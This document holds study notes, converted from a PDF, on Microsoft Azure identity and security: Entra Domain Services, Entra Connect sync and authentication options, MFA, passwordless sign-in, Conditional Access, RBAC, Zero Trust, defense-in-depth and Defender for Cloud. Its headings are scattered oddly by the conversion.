### By using Microsoft Entra Domain Services, you can freely migrate applications

### that use LDAP, NTLM, or the Kerberos protocols from your on-premises

### infrastructure to the cloud. You can also use applications such as Microsoft SQL

### Server or Microsoft SharePoint Server on VMs or deploy them in the Azure IaaS,

without needing domain controllers in the cloud or a VPN to local infrastructure.
### Current Basic Setup for Companies Applications:

### Many companies run their essential line-of-business (LOB) applications on

### computers that are part of a controlled network. This network uses a centralized

### system big Digital List (like Active Directory) to verify who can access these

systems and also to manage various settings centrally.
### Challenges with Moving to Cloud:

### When considering moving these applications to Microsoft Azure, a cloud platform,

### the main challenge is how to handle user authentication and settings management

in the cloud as efficiently as they do with their current systems. How do they
check user permissions in the cloud like they do on their own computers?
### Solutions for Connecting to the Cloud

Using a Site-to-Site Virtual Private Network (VPN): This is like building a secure
### bridge between the company's local infrastructure network and Azure IAAS so

everything works smoothly like it does on-premises.
### Replicating Domain Controllers to Azure: Think of domain controllers as the

guards checking IDs at the door. Companies can set up virtual versions of these network controllers in Azure. Both methods are effective but may lead to higher costs and increased management efforts.
### Microsoft Entra Domain Services as an Alternative:

Microsoft offers a service called Microsoft Entra Domain Services which is a part
### of their Entra ID plans. This service lets you manage user permissions and

settings directly in the cloud, just like how you'd do it on-premises but without
### needing extra hardware or complex setups. It matches perfectly with your

existing setup, so you don't have to change much. This service, which runs as part
### of the Microsoft Entra ID P1 or P2 tier, provides domain services such as Group

### Policy management, domain joining, and Kerberos authentication to your Microsoft

Entra tenant. These services are fully compatible with locally deployed AD DS, so you can use them without deploying and managing additional domain controllers in the cloud.
### Integration of Local and Cloud Networks:

### One method of connecting Microsoft Entra ID with your on-premises AD is using

### Microsoft Entra Connect. Microsoft Entra Connect synchronizes user identities

### between on-premises Active Directory and Microsoft Entra ID. Microsoft Entra

### Connect synchronizes changes between both identity systems, so you can use

features like SSO, multifactor authentication, and self-service password reset under both systems.
### With a feature called Microsoft Entra Connect, company users can log in using

### their regular work credentials across both local and cloud environments

### seamlessly. Companies without their own local setups can rely entirely on

### Microsoft Entra’s cloud services, simplifying deployment and management. Also,

### Because Microsoft Entra ID can integrate with your local AD DS, when you

implement Microsoft Entra Connect, users can utilize organizational credentials in
### both on-premises AD DS and in Microsoft Entra Domain Services. Even if you don’t

### have AD DS deployed locally, you can choose to use Microsoft Entra Domain

Services as a cloud-only service. This enables you to have similar functionality of
### locally deployed AD DS without having to deploy a single domain controller on-

premises or in the cloud. A managed domain is configured to perform a one-way
### synchronization from Microsoft Entra ID to Microsoft Entra Domain Services. You

### can create resources directly in the managed domain, but they aren't

### synchronized back to Microsoft Entra ID. In a hybrid environment with an on-

### premises AD DS environment, Microsoft Entra Connect synchronizes identity

information with Microsoft Entra ID, which is then synchronized to the managed domain.
### Applications, services, and VMs in Azure that connect to the managed domain can

### then use common Microsoft Entra Domain Services features such as domain join,

group policy, LDAP, and Kerberos/NTLM authentication.
### Practical Use Case:

### By setting up a virtual network that connects on-premises systems to Microsoft

### Entra, organizations enable a smooth transition where all users and services can

### operate securely under Microsoft Entra’s domain services, providing a consistent

experience whether on-premises or in the cloud.
### In essence, this approach provides a streamlined way to extend traditional on-

### premises app management and authentication practices into the cloud environment,

leveraging Microsoft's tools for ease and efficiency.
### For many organizations that have some services on their networks and some

services in the cloud, synchronization and integration between Microsoft Entra ID
### and on-premises AD DS is the way to deliver the best user experience. Directory

### synchronization enables user, group, and contact synchronization between on-

premises Active Directory and Microsoft Entra ID. In its simplest form, you install a directory synchronization component on a server in your on-premises domain. All your user accounts, groups, and contacts from Active Directory then replicate to Microsoft Entra ID. Those accounts can then sign in and access Azure services.
### Microsoft provides Microsoft Entra Connect to perform directory synchronization

### between Microsoft Entra ID and AD DS. By default, Microsoft Entra Connect

### synchronizes all users and groups. If you don’t want to synchronize your entire

### on-premises AD DS, directory synchronization for Microsoft Entra ID supports

limited filtering and customization of attribute flow based on the following values:
### OU | Domain | User attributes | Applications

When directory synchronization is enabled, you have the following authentication
options: Separate Cloud Password
- Identity synced, but password is not
- User gets a different password in the cloud
- Can cause confusion
### Synchronized Password

- Passwords are synced from AD DS to Entra ID
- Users can use same credentials
- Not true SSO — users still get login prompts
### Pass-through Authentication

- Entra ID validates users && passes auth request to Entra Connect
- Auth is validated on-prem
- Provides true SSO — no extra prompts
### Federated Identities

- AD FS performs authentication on-premises instead of Microsoft Entra Connect.
- Uses claims-based authentication
- Supports multiple cloud apps
- Also provides true SSO
Single sign-on (SSO) enables a user to sign in one time and use that credential to
### access multiple resources and applications from different providers. For SSO to

work, the different applications and providers must trust the initial authenticator.
### With SSO, you need to remember only one ID and one password. Access across

applications is granted to a single identity that's tied to the user, which simplifies the security model. Single sign-on is only as secure as the initial authenticator because the subsequent connections are all based on the security of the initial authenticator.
### Multifactor authentication is the process of prompting a user for an extra form

(or factor) of identification during the sign-in process. MFA helps protect against a
### password compromise in situations where the password was compromised but the

### second factor wasn't. Microsoft Entra multifactor authentication is a Microsoft

service that provides multifactor authentication capabilities.
### Passwordless authentication methods are more convenient because the password is

removed and replaced with something you have, plus something you are, or something you know. Passwordless authentication needs to be set up on a device before it can work.
### Microsoft global Azure and Azure Government offer the following three

### passwordless authentication options that integrate with Microsoft Entra ID:

### Windows Hello for Business-Windows Hello for Business is ideal for information

### workers that have their own designated Windows PC. The biometric and PIN

credentials are directly tied to the user's PC, which prevents access from anyone other than the owner.
### Microsoft Authenticator app-The Authenticator App turns any iOS or Android

phone into a strong, passwordless credential. Users can sign-in to any platform or
### browser by getting a notiﬁcation to their phone, matching a number displayed on

the screen to the one on their phone, and then using their biometric (touch or face) or PIN to confirm.
### FIDO2 security keys-FIDO2 security keys are an unphishable standards-based

### passwordless authentication method that can come in any form factor. Fast

### Identity Online (FIDO) is an open standard for passwordless authentication. FIDO

### allows users and organizations to leverage the standard to sign-in to their

resources without a username or password by using an external security key or a platform key built into a device. Conditional Access is a tool that Microsoft Entra ID uses to allow (or deny) access
### to resources based on identity signals. These signals include who the user is,

where the user is, and what device the user is requesting access from.
### Conditional Access also provides a more granular multifactor authentication

experience for users. During sign-in, Conditional Access collects signals from the
### user, makes decisions based on those signals, and then enforces that decision by

allowing or denying the access request or challenging for a Multifactor Authentication response.
### Conditional Access is useful when you need to Require MFA to access an

application depending on the requester’s role, location, or network. Require access
### to Services only through approved client applications. Require users to access

### your application only from managed devices. Block Access from Untrusted Sources

I.e access from unknown or unexpected locations.
### Azure role-based access control (Azure RBAC) Azure provides built-in roles that

### describe common access rules for cloud resources. Azure enables you to control

### access through ROLES. You can also deﬁne your own roles. Each role has an

### associated set of access permissions that relate to that role. When you assign

individuals or groups to one or more roles, they receive all the associated access
### permissions. Role-based access control is applied to a scope, Scopes include:

A management group (a collection of multiple subscriptions). A single subscription. A resource group.
A single resource.
### Azure RBAC is hierarchical, in that when you grant access at a parent scope,

### those permissions are inherited by all child scopes. Azure RBAC is enforced on

### any action that's initiated against an Azure resource that passes through Azure

### Resource Manager. Resource Manager is a management service that provides a

### way to organize and secure your cloud resources. Azure RBAC doesn't enforce

access permissions at the application or data level. Application security must be
### handled by your application. Azure RBAC uses an allow model. When you're

assigned a role, Azure RBAC allows you to perform actions within the scope of that role.
### Zero Trust is a security model that assumes the worst case scenario and protects

### resources with that expectation. Zero Trust assumes breach at the outset, and

then verifies each request as though it originated from an uncontrolled network.
### Zero Trust is based on these guiding principles:

Verify explicitly - Always authenticate and authorize based on all available data points.
### Use least privilege access - Limit user access with Just-In-Time and Just-

Enough-Access (JIT/JEA), risk-based adaptive policies, and data protection.
### Assume breach - Minimize blast radius and segment access. Verify end-to-end

encryption. Use analytics to get visibility, drive threat detection, and improve defenses.
### A Defense-in-Depth strategy uses a series of mechanisms to slow the advance of

### an attack that aims at acquiring unauthorized access to data. The objective of

### “Defense-in-Depth” is to protect information and prevent it from being stolen by

those who aren't authorized to access it. You can visualize defense-in-depth as a set of layers, with the data to be secured at the center and all the other layers functioning to protect that central data layer.
### Each layer provides protection so that if one layer is breached, a subsequent

### layer is already in place to prevent further exposure. This approach removes

### reliance on any single layer of protection. It slows down an attack and provides

### alert information that security teams can act upon, either automatically or

### manually.Here's a brief overview of the role of each layer:

The physical security layer is the first line of defense to protect computing hardware in the datacenter. The identity and access layer controls access to infrastructure and change control.
### The perimeter layer uses distributed denial of service (DDoS) protection to

filter large-scale attacks before they can cause a denial of service for users. The network layer limits communication between resources through
segmentation and access controls. The compute layer secures access to virtual machines. The application layer helps ensure that applications are secure and free of security vulnerabilities. The data layer controls access to business and customer data that you need to protect.
### Azure Microsoft Defender for Cloud serves as a comprehensive monitoring tool for

### security posture management and threat protection. It provides guidance and

### notiﬁcations to strengthen your security across various environments, including

cloud, on-premises, hybrid, and multicloud setups. Being an Azure-native service,
### it inherently monitors and protects many Azure services without requiring

### additional deployment. To gather security-related data when necessary, Defender

for Cloud can automatically deploy a Log Analytics agent, handling the deployment
### directly for Azure machines. Furthermore, it delivers customized threat

intelligence and prioritized alerts tailored to your specific environment, helping
### you concentrate on the most critical issues. Defender for Cloud addresses three

### key aspects of security management: continuously ASSESSING your security

### posture to identify vulnerabilities, SECURING your resources and services based

### on the Azure Security Benchmark, and DEFENDING against threats to your

resources, workloads, and services through detection, alerts, and resolution.
### Hybrid Environments -> To extend Defender for Cloud's protection to your on-

### premises machines within a hybrid environment, you need to deploy Azure Arc and

### then enable Defender for Cloud's enhanced security features. Azure Arc acts as a

### bridge, allowing you to manage and secure your on-premises servers and other

infrastructure as if they were Azure resources. Azure Arc's agent is like a local
### representative that you install on your on-premises machines. This agent allows

### those machines to "register" with Azure and be managed through the Azure

portal, just like native Azure resources. You can then apply Azure policies, manage extensions, monitor performance, and more, all from a centralized Azure control plane
### Multicloud Environments -> Defender for Cloud's security posture management

### (CSPM) capabilities are extended to multicloud environments, speciﬁcally your

### AWS resources, without the need for any agents. This agentless plan evaluates

### your AWS resources against AWS-speciﬁc security recommendations and

### incorporates the ﬁndings into your secure score. Defender for Cloud organizes

### these recommendations into security controls, assigning a secure score value to

### each. This secure score provides an immediate understanding of your security

health, while the controls offer actionable steps to improve your score and overall
security posture. Additionally, Defender for Cloud's threat protection in multicloud
### environments includes fusion kill-chain analysis, which automatically correlates

alerts across your environment based on the cyber kill-chain framework.


---

*Document converted from PDF: Reverse Engineering & System Architecture.pdf*
